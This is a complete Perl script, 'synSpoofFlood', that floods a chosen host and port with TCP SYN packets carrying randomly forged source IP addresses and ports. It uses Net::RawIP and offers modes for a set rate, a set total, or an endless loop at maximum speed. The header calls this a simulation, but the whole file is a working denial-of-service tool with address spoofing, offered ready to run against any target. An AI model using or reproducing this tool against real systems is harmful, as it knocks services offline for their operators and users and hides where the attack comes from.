#!/usr/bin/perl
# synSpoofFlood
# Author: Lucas Allan
#
# Based on Simple SYN Flooder by iphelix
# Requires libpcap, perl, Net::RawIP module, and root privileges
#
# SYNOPSIS:
#   ./syn_spoof_flood.pl  [-f frequency] [-t total] [-r] host port
#
# Description:
#   The syn_spoof_flood.pl simulates the TCP **SYN** flood attack.
# There are three methods to send SYN packets which generate random
# source IP addresses and ports. The option **-f** assigns frequency
# mode, which will send ${frequency} SYN packets every second; The 
# option -t assigns total mode, which will send ${total} SYN packets
# in all; And the option -r assigns enhance mode, which will send
# SYN packets as fast as your system can.
# 
#   -r: enhance mode, send packets as fast as system can.
#   -f frequency: frequency is in range [1, 1000000].
#   -t total: send total packets in all.
#
# Updates: 
#   2013-08-20  Added two mode: by frequency and by total 
#               Modified by lancerexw(lancerexw@gmail.com) 

use Net::RawIP;

# added by lancerexw
use Time::HiRes qw(usleep nanosleep);

$dst = "";
$port = 0;
$freq = 0;
$total = 0;
$enhance = 0;  # enhance mode

sub usage() {
    print "
./syn_spoof_flood.pl  [-f frequency] [-t total] [-r] host port
    -f: frequency
    -t: total
    -r: enhance\n";
}

sub process_args() {
    while ( @ARGV ) {
        my $a = shift @ARGV;
        if ( $a =~ m/\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/ ) {
            $dst = $a;
            print "host=$dst\n";
            next;
        }

        if ( $a =~ m/\d{1,5}/ )  {
            $port = $a;
            print "port=$port\n";
            next;
        }

        if ( $a eq "-r" ) {
            $enhance = 1;
            print "enter enhance mode\n";
        } elsif ( $a eq "-f" ) {
            $freq = shift @ARGV;
            print "frequency=$freq\n";
            if ( $freq > 1000000 ) {
                print "frequency must less than 1000000\n";
            }
        } elsif ( $a eq "-t" ) {
            $total = shift @ARGV;
            print "total=$total\n";
        } else {
            usage();
        }
    }
}

sub geraIP() {
    $range = 255;
    $iA = int(rand($range));
    $iB = int(rand($range));
    $iC = int(rand($range));
    $iD = int(rand($range));
    
    return $iA . "." . $iB . "." . $iC . "." . $iD;
}

sub send_syn_packet {
    $handle = $_[0];

    $src_port = int(rand(65534))+1;
    $src = geraIP();
    print "src=$src:$src_port\ndst=$dst:$port\n";
    $handle->set({ ip => { saddr => $src, daddr => $dst }, tcp => { source => $src_port, dest => $port, syn => 1 } });
    $handle->send;
}

sub attack() {
    process_args();
    if ( $dst == "" || $port == "" ) {
        usage();
        return;
    }

    $h = new Net::RawIP;
    @param = ($h, "");

    if ( $enhance == 1 ) {
        print "send SYN packets in infinite loop\n";
        while ( 1 ) {
            send_syn_packet @param;
        }
    } elsif ( $freq != 0 ) {
        $intvl = 1000000 / $freq;
        print "send SYN packets by frequency $freq\n";
        while ( 1 ) {
            send_syn_packet @param;
            usleep($intvl);
        }
    } elsif ( $total != 0 ) {
        for ( $i = 0; $i < $total; $i += 1 ) {
            send_syn_packet @param;
        }
    } else {
        print "unknown mode\n";
    }
}

attack();
